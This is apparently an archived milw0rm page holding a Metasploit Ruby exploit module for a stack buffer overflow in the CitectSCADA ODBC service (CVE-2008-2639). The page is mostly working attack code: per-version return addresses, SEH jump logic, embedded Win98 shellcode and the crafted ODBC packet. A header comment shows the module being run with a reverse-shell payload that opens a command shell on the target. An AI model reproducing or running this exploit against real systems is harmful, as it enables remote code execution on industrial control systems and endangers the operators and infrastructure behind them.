<html><head><title>CitectSCADA ODBC Server Remote Stack Buffer Overflow Exploit (meta)</title></head><pre>##
# $Id: citect_scada_odbc.rb
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##
# 
#
# msfcli exploit/windows/misc/citect_scada_odbc RHOST=192.168.2.45 PAYLOAD=windows/shell/reverse_ord_tcp LHOST=192.168.2.101  TARGET=2 E
# [*] Started reverse handler
# ...
# [*] Sending stage (474 bytes)
# [*] Command shell session 1 opened (192.168.2.101:4444 -&gt; 192.168.2.45:1039)
# 
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Program Files\Citect\CitectSCADA\Bin&gt;
# 
# Arbitrary code has been sucessfully run on Windows XP SP2 and SP3, Win98 SE and Windows 2003 Server SP1
#
require 'msf/core'

module Msf

class Exploits::Windows::Misc::Citect_SCADA_ODBC &lt; Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'CitectSCADA ODBC Buffer Overflow',
			'Description'    =&gt; %q{
				This module exploits a stack overflow in CitectSCADA's ODBC daemon.
				This has only been tested against Citect v5, v6 and v7. 
			},
			'Author'         =&gt; [ 'KF &lt;kf_lists[at]digitalmunition.com&gt;' ],
			'Version'        =&gt; '$Revision: 1 $',
			'References'     =&gt; 
				[
					['CVE', 'CVE-2008-2639'],
					['BID', '29634'],
					['URL', 'http://www.schneider-electric.com/sites/corporate/en/press/press-releases/viewer-press-releases.page?c_filepath=/templatedata/Content/Press_Release/data/en/shared/2005/10/20051019_schneider_electric_adds_scada_and_mes_capabilities_to_i.xml'],
					['URL', 'http://www.coresecurity.com/content/citect-scada-odbc-service-vulnerability','http://www.auscert.org.au/render.html?it=9433'],
					['URL', 'http://www.auscert.org.au/render.html?it=9433'],
					['URL', 'http://www.controsys.hu/anyagok/group_quality_assurance.pdf'],
					['URL', 'http://www.citect.com/documents/news_and_media/pr-citect-address-security.pdf'],
				],
			'DefaultOptions' =&gt;
				{
					'EXITFUNC' =&gt; 'thread',
				},
			'Payload'        =&gt;
				{
					'BadChars' =&gt; &quot;\x00&quot;,
					'StackAdjustment' =&gt; -3500
				},
			'Platform'       =&gt; 'win',
			
			'Targets'        =&gt;
				[
					# Small sample of potential targets... There ARE universal targets for *some* versions. The base address can varry unfortunately.
					['CiExceptionMailer.dll on XP Sp2 or SP3 5.42',     { 'Version' =&gt; '5.42',    'OS' =&gt; 'xp',    'Ret' =&gt; 0x003a530e, 'Jump' =&gt; 0xffffff11e9, 'Payload' =&gt; { 'Space' =&gt; 216  } } ],
					['CiExceptionMailer.dll on Server 2003 Sp2 6.0-r0', { 'Version' =&gt; '6.0-r0',  'OS' =&gt; '2003',  'Ret' =&gt; 0x003a6aad, 'Jump' =&gt; 0xffffff15e9, 'Payload' =&gt; { 'Space' =&gt; 212  } } ],    
					['CiExceptionMailer.dll on XP Sp2 or SP3 6.0-r0',   { 'Version' =&gt; '6.0-r0',  'OS' =&gt; 'xp',    'Ret' =&gt; 0x0039cd5a, 'Jump' =&gt; 0xffffff11e9, 'Payload' =&gt; { 'Space' =&gt; 216  } } ],    
					['CiExceptionMailer.dll on XP Sp2 or SP3 6.10',    { 'Version' =&gt; '6.10',    'OS' =&gt; 'xp',    'Ret' =&gt; 0x00501113, 'Jump' =&gt; 0xffffff11e9, 'Payload' =&gt; { 'Space' =&gt; 380  } } ],  
					['CiExceptionMailer.dll on XP Sp2 or SP3 7.0-r0',   { 'Version' =&gt; '7.0-r0',  'OS' =&gt; 'xp',    'Ret' =&gt; 0x003e1e92, 'Jump' =&gt; 0xffffff11e9, 'Payload' =&gt; { 'Space' =&gt; 380  } } ],  
					['CiExceptionMailer.dll on 2003 Server SP1 7.0-r0', { 'Version' =&gt; '7.0-r0',  'OS' =&gt; '2003',  'Ret' =&gt; 0x003d59d7, 'Jump' =&gt; 0xfffffe7be9, 'Payload' =&gt; { 'Space' =&gt; 376  } } ],  
					['CiExceptionMailer.dll on Win98 5.50-r0',	    { 'Version' =&gt; '5.50-r0', 'OS' =&gt; 'win98', 'Ret' =&gt; 0x006dd8b7, 'Jump' =&gt; 0xffffff6fe9, 'Payload' =&gt; { 'Space' =&gt; 140  } } ],  
					['CiExceptionMailer.dll on XP SP2 5.50-r0',	    { 'Version' =&gt; '5.50-r0', 'OS' =&gt; 'xp',    'Ret' =&gt; 0x003a5e90, 'Jump' =&gt; 0xffffff11e9, 'Payload' =&gt; { 'Space' =&gt; 216  } } ],  
					['CiExceptionMailer.dll on 2003 Server 5.50-r0',    { 'Version' =&gt; '5.50-r0', 'OS' =&gt; '2003',  'Ret' =&gt; 0x003952ee, 'Jump' =&gt; 0xffffff15e9, 'Payload' =&gt; { 'Space' =&gt; 212  } } ],  
					['Test Crash',	  			            { 'Version' =&gt; '666',     'OS' =&gt; 'test',  'Ret' =&gt; 0xdeadbeef, 'Jump' =&gt; 0xdeadbabeee, 'Payload' =&gt; { 'Space' =&gt; 8192 } } ],  
				], 

			'Privileged'     =&gt; false,
			'DisclosureDate' =&gt; 'June 11 2008'
			))

			register_options(
			[
				Opt::RPORT(20222)
			], self.class)
	end

	def exploit
		connect

		print_status(&quot;Trying target #{target.name}...&quot;)
		if payload_space() != payload.encoded.length
			print_status(&quot;Metasploit payload bug... please check out from SVN&quot;)
			exit
		else 
			print_status(&quot;Space: #{payload_space()}&quot;)	
		end

		shortjmp   =    0xeb069090      # jump over garbage for SEH foo

		if(target['OS'] =~ /xp/)
			print_status(&quot;Using Windows XP Target&quot;)
		elsif (target['OS'] =~ /2003/)
			print_status(&quot;Using Windows 2003 Target&quot;)
		elsif (target['OS'] =~ /98/)
			print_status(&quot;no 98 foo yet&quot;)
		else (target['OS'] =~ /test/)
			print_status(&quot;Just testing.... don't mind me&quot;)
		end
	
		padding = 100  # Just fill up the end of the stack... 

		# There is some redundant shit here... will be cleaned up soon enough... 
		if (target['Version'] =~ /5.42/) || (target['Version'] =~ /6.0-r0/)
			filler = &quot;\x90&quot; * 10 + [target['Jump']].pack('Q')[0..4] + &quot;\x90&quot; * padding  
			mal = payload.encoded + [shortjmp].pack(&quot;N&quot;) + [target.ret].pack(&quot;V&quot;) + filler
		elsif (target['Version'] =~ /6.10/) || (target['Version'] =~ /7.0-r0/) 
			filler = [target['Jump']].pack('Q')[0..4] + &quot;\x90&quot; * padding  
			mal = payload.encoded + [shortjmp].pack(&quot;N&quot;) + [target.ret].pack(&quot;V&quot;) + filler
		elsif (target['Version'] =~ /5.50-r0/) 

			# This particular target encompases win98 windows XP and windows 2003 just so that no one feels left out. 
			# EVERYONE *CAN* be exploited... not just the guys running the modern stuff. Someone only needs to take a bit
			# of time to have a robust exploit for any platform or version they choose... 

			if(target['OS'] =~ /win98/)
				hop1 = 0xebb69090     # Short jump into small 72 byte buffer space - EBb6
				hop2 = target['Jump'] # Near jump into begining of entire buffer... leaves 140 chars of space. 
				seh = [target.ret].pack(&quot;V&quot;) # Call EAX from CiExceptionMailer.dll
	
				# Description : It is 110 Byte Shellcode which Pops up Message Box Under win98
				# This is just sample code from the milw0rm...its using static addresses from MY win98
				hell = 
				&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb&quot; + 
				&quot;\xd0\x76\xf7\xbf&quot; +   # LoadLibraryA(libraryname) IN win98
				&quot;\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb&quot; +
				&quot;\xa8\x6d\xf7\xbf&quot; +   # GetProcAddress(hmodule,functionname)
				&quot;\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51&quot; +
				&quot;\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff&quot; +
				&quot;\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff&quot; +
				&quot;\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff&quot; +
				&quot;\xff&quot; + &quot;PWNED.&quot; + &quot;\x4e&quot;
				mal = &quot;\x90&quot; * (payload_space - hell.length) + hell + [hop2].pack('Q')[0..4] + &quot;Z&quot; * 67 + [hop1].pack(&quot;N&quot;) + seh + &quot;\x41&quot; * padding
			elsif target['OS'] =~ /xp/ || target['OS'] =~ /2003/
				filler = &quot;\x90&quot; * 10 + [target['Jump']].pack('Q')[0..4] + &quot;\x90&quot; * padding  
				mal = payload.encoded + [shortjmp].pack(&quot;N&quot;) + [target.ret].pack(&quot;V&quot;) + filler
			end

		else (target['Version'] =~ /666/) 
			# Use this to find offsets for other versions that were not provided. 
			mal = Rex::Text.pattern_create(payload_space, Rex::Text::DefaultPatternSets)
			print_status(&quot;Use pattern_offset.rb to find the length&quot;)
		end	
	
		# Open your eyes people... listen carefully to the rhetoric. There is no spoon. 
		wakeup = [0x0000000002].pack('Q')[0..4] + [mal.length].pack(&quot;N&quot;) + mal

		len = [wakeup.length].pack(&quot;N&quot;)
		sock.put(len)
		sock.put(wakeup)
		print_status(&quot;Sent malicious ODBC packet...&quot;)

		handler
		print_status(&quot;Citect and other SCADA and Control vendors have been communicating potential &quot; +
			&quot;vulnerabilities of control systems when they are connected to the internet for some time. &quot;)
		print_status(&quot;However, Citect believes this is only relevant to a company using ODBC technology and &quot; +
			&quot;directly connecting its system to the internet with no security in place -&quot;) 
		print_status(&quot;a situation unlikely in todayâ€™s business environment. &quot;)

		disconnect	
	end

end
end

# milw0rm.com [2008-09-05]</pre></html>